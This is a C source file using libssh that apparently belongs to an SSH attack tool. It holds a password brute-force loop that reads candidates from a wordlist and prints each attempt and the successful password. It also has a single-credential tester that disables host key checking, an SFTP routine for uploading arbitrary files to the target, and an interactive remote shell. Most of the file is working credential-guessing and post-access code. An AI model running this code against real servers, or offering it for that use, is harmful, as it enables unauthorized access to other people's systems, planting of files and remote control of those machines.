#include "ssh_utils.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <termios.h>
#include <fcntl.h>

// ==================== Core SSH Functions ====================

int initialize_ssh_session(ssh_session *session, const char *target, const char *username, int port) {
    *session = ssh_new();
    if (!*session) {
        fprintf(stderr, "Error creating SSH session\n");
        return -1;
    }

    ssh_options_set(*session, SSH_OPTIONS_HOST, target);
    ssh_options_set(*session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(*session, SSH_OPTIONS_USER, username);

    printf("[*] Connecting to %s:%d as %s...\n", target, port, username);
    if (ssh_connect(*session) != SSH_OK) {
        fprintf(stderr, "Error connecting to %s: %s\n", target, ssh_get_error(*session));
        ssh_free(*session);
        return -1;
    }
    
    printf("[+] Connected to %s\n", target);
    return 0;
}

int authenticate_ssh_session(ssh_session session, const char *password_file) {
    if (password_file) {
        FILE *pf = fopen(password_file, "r");
        if (!pf) {
            fprintf(stderr, "Can't open password file %s\n", password_file);
            return -1;
        }

        char password[256];
        int authenticated = 0;
        
        printf("[*] Starting password brute force from %s\n", password_file);
        while (fgets(password, sizeof(password), pf)) {
            password[strcspn(password, "\n")] = 0;
            
            printf("[*] Trying password: %s\n", password);
            if (ssh_userauth_password(session, NULL, password) == SSH_AUTH_SUCCESS) {
                printf("[+] Authenticated with password: %s\n", password);
                authenticated = 1;
                break;
            }
        }
        
        fclose(pf);
        
        if (!authenticated) {
            fprintf(stderr, "[-] Failed to authenticate with any password\n");
            return -1;
        }
    } else {
        printf("[*] Attempting authentication...\n");
        if (ssh_userauth_publickey_auto(session, NULL, NULL) == SSH_AUTH_SUCCESS) {
            printf("[+] Authenticated with public key\n");
        } else {
            char *password = getpass("Password: ");
            if (ssh_userauth_password(session, NULL, password) != SSH_AUTH_SUCCESS) {
                fprintf(stderr, "[-] Authentication failed\n");
                memset(password, 0, strlen(password));
                return -1;
            }
            printf("[+] Authenticated with password\n");
            memset(password, 0, strlen(password));
        }
    }
    return 0;
}

int authenticate_ssh_session_auto(ssh_session session, const char *password_file) {
    if (password_file && !password_loaded) {
        if (!load_password_from_file(password_file)) {
            return -1;
        }
    }
    
    printf("[*] Starting authentication...\n");
    
    if (ssh_userauth_publickey_auto(session, NULL, NULL) == SSH_AUTH_SUCCESS) {
        printf("[+] Authenticated with public key\n");
        return 0;
    }
    
    if (global_password) {
        printf("[*] Trying password authentication...\n");
        if (ssh_userauth_password(session, NULL, global_password) == SSH_AUTH_SUCCESS) {
            printf("[+] Authenticated with password\n");
            return 0;
        } else {
            fprintf(stderr, "[-] Password authentication failed\n");
            return -1;
        }
    }
    
    char *password = getpass("Password: ");
    if (ssh_userauth_password(session, NULL, password) != SSH_AUTH_SUCCESS) {
        fprintf(stderr, "[-] Authentication failed\n");
        memset(password, 0, strlen(password));
        return -1;
    }
    
    printf("[+] Authenticated with interactive password\n");
    memset(password, 0, strlen(password));
    return 0;
}

void cleanup_ssh_session(ssh_session session) {
    if (session) {
        ssh_disconnect(session);
        ssh_free(session);
    }
}

int try_connection(const char *host, int port, const char *username, const char *password) {
    ssh_session session;
    int rc;
    int connected = 0;

    session = ssh_new();
    if (session == NULL) {
        fprintf(stderr, "Error creating SSH session\n");
        return 0;
    }

    ssh_options_set(session, SSH_OPTIONS_HOST, host);
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(session, SSH_OPTIONS_USER, username);
    ssh_options_set(session, SSH_OPTIONS_STRICTHOSTKEYCHECK, "no");

    rc = ssh_connect(session);
    if (rc != SSH_OK) {
        fprintf(stderr, "Error connecting to %s:%d: %s\n", host, port, ssh_get_error(session));
        ssh_free(session);
        return 0;
    }

    rc = ssh_userauth_password(session, NULL, password);
    if (rc == SSH_AUTH_SUCCESS) {
        printf("SUCCESS! Authentication successful with password: %s\n", password);
        connected = 1;
    } else if (rc == SSH_AUTH_DENIED) {
        printf("Authentication denied for password: %s\n", password);
    } else if (rc == SSH_AUTH_PARTIAL) {
        printf("Partial authentication for password: %s\n", password);
    } else {
        printf("Authentication error for password: %s: %s\n", password, ssh_get_error(session));
    }

    ssh_disconnect(session);
    ssh_free(session);

    return connected;
}

// ==================== File Operations ====================

void upload_file(ssh_session session, const char *local_path, const char *remote_path) {
    FILE *file = fopen(local_path, "rb");
    if (!file) {
        perror("Failed to open local file");
        return;
    }

    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    fseek(file, 0, SEEK_SET);

    char *buffer = malloc(size);
    if (!buffer) {
        perror("Memory allocation failed");
        fclose(file);
        return;
    }

    if (fread(buffer, 1, size, file) != size) {
        perror("Failed to read file");
        free(buffer);
        fclose(file);
        return;
    }
    fclose(file);

    if (upload_file_data(session, buffer, size, remote_path) != 0) {
        fprintf(stderr, "Failed to upload file\n");
    }

    free(buffer);
}

int upload_file_data(ssh_session session, const void *data, size_t size, const char *remote_path) {
    sftp_session sftp = sftp_new(session);
    if (!sftp) {
        fprintf(stderr, "Error allocating SFTP session: %s\n", ssh_get_error(session));
        return -1;
    }

    if (sftp_init(sftp) != SSH_OK) {
        fprintf(stderr, "Error initializing SFTP session: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return -1;
    }

    sftp_file file = sftp_open(sftp, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (!file) {
        fprintf(stderr, "Can't open remote file: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return -1;
    }

    size_t written = 0;
    while (written < size) {
        size_t chunk = (size - written) > 32768 ? 32768 : (size - written);
        int nwritten = sftp_write(file, (const char *)data + written, chunk);
        if (nwritten < 0) {
            fprintf(stderr, "Error writing to remote file: %s\n", ssh_get_error(session));
            sftp_close(file);
            sftp_free(sftp);
            return -1;
        }
        written += nwritten;
    }

    sftp_close(file);
    sftp_free(sftp);
    return 0;
}

void interactive_shell(ssh_session session) {
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) {
        fprintf(stderr, "Error creating channel: %s\n", ssh_get_error(session));
        return;
    }

    if (ssh_channel_open_session(channel) != SSH_OK) {
        fprintf(stderr, "Error opening channel: %s\n", ssh_get_error(session));
        ssh_channel_free(channel);
        return;
    }

    if (ssh_channel_request_pty(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting PTY: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return;
    }

    if (ssh_channel_request_shell(channel) != SSH_OK) {
        fprintf(stderr, "Error requesting shell: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return;
    }

    struct termios oldt, newt;
    tcgetattr(STDIN_FILENO, &oldt);
    newt = oldt;
    newt.c_lflag &= ~(ICANON | ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);

    fd_set fds;
    char buffer[1024];
    int nbytes;

    while (1) {
        FD_ZERO(&fds);
        FD_SET(STDIN_FILENO, &fds);
        FD_SET(ssh_get_fd(session), &fds);

        if (select(ssh_get_fd(session) + 1, &fds, NULL, NULL, NULL) < 0) {
            perror("select");
            break;
        }

        if (FD_ISSET(STDIN_FILENO, &fds)) {
            nbytes = read(STDIN_FILENO, buffer, sizeof(buffer));
            if (nbytes > 0) {
                if (ssh_channel_write(channel, buffer, nbytes) != nbytes) {
                    fprintf(stderr, "Error writing to channel\n");
                    break;
                }
            } else {
                break;
            }
        }

        if (FD_ISSET(ssh_get_fd(session), &fds)) {
            nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
            if (nbytes > 0) {
                if (write(STDOUT_FILENO, buffer, nbytes) != nbytes) {
                    perror("write");
                    break;
                }
            } else if (nbytes < 0) {
                fprintf(stderr, "Error reading from channel\n");
                break;
            } else {
                break;
            }
        }
    }

    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
}

